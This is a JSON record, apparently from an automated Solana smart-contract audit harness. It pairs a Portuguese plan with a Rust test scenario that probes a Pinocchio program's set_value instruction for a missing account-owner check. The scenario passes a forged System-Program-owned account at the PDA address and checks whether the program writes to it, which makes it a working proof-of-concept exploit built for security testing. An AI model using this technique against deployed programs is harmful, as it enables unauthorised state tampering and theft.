{"plan": "O programa set_value (Pinocchio) recebe accounts[0] como data_account e accounts[1] como user, deriva o PDA com seeds [b"data", user.key(), bump] e exige que data_account.key() seja igual ao PDA. Nao ha checagem de owner. Para o baseline, criamos uma conta com owner = program_id no endereco do PDA e chamamos set_value legitimamente. Para o ataque, fornecemos no mesmo endereco do PDA uma conta cujo owner e outro programa (ex.: System Program), mantendo o mesmo user e bump; se o programa aceitar e escrever nela, a hipotese OWNER esta confirmada. O efeito medido e que a conta forjada (owner diferente) foi modificada com o user e o value do ataque.", "scenario": "let program_id = env.program_id;

let user = Pubkey::new_unique();
let bump: u8 = 255;
let value: u64 = 42;

let (pda, _) = Pubkey::find_program_address(&[b"data", user.as_ref()], &program_id);

// Conta legitima: owner = program_id, dados com discriminador/espaco suficiente
let mut legit_data = vec![0u8; 64];
legit_data[0] = 1;
let legit_account = account(&program_id, &legit_data, None);

let user_account = wallet(1_000_000_000);

let ix_data = {
    let mut d = vec![0u8; 10];
    d[0] = 0; // IX_SET_VALUE
    d[1] = bump;
    d[2..10].copy_from_slice(&value.to_le_bytes());
    d
};

let metas = vec![
    AccountMeta::new(pda, false),
    AccountMeta::new_readonly(user, false),
];

let ix = env.raw_ix(&ix_data, metas.clone());

let contas = vec![
    (pda, legit_account.clone()),
    (user, user_account.clone()),
];

let base = env.baseline("set_value legitimo com conta do programa", &ix, &contas);

// Ataque: mesma conta no endereco do PDA, mas com owner diferente (System Program)
let mut forged_data = vec![0u8; 64];
forged_data[0] = 1;
let forged_account = account(&solana_sdk::system_program::id(), &forged_data, None);

let attack_contas = vec![
    (pda, forged_account),
    (user, user_account),
];

let r = env.attack("set_value com conta forjada de outro owner no PDA", &ix, &attack_contas);

if r.program_result == ProgramResult::Success {
    let after_data = after(&r, &pda).data();
    let owner_after = after(&r, &pda).owner();
    env.effect(
        "conta com owner diferente foi aceita e escrita pelo programa",
        *owner_after != program_id
            && read_pubkey(after_data, 8) == user
            && read_u64(after_data, 40) == value,
    );
}"}

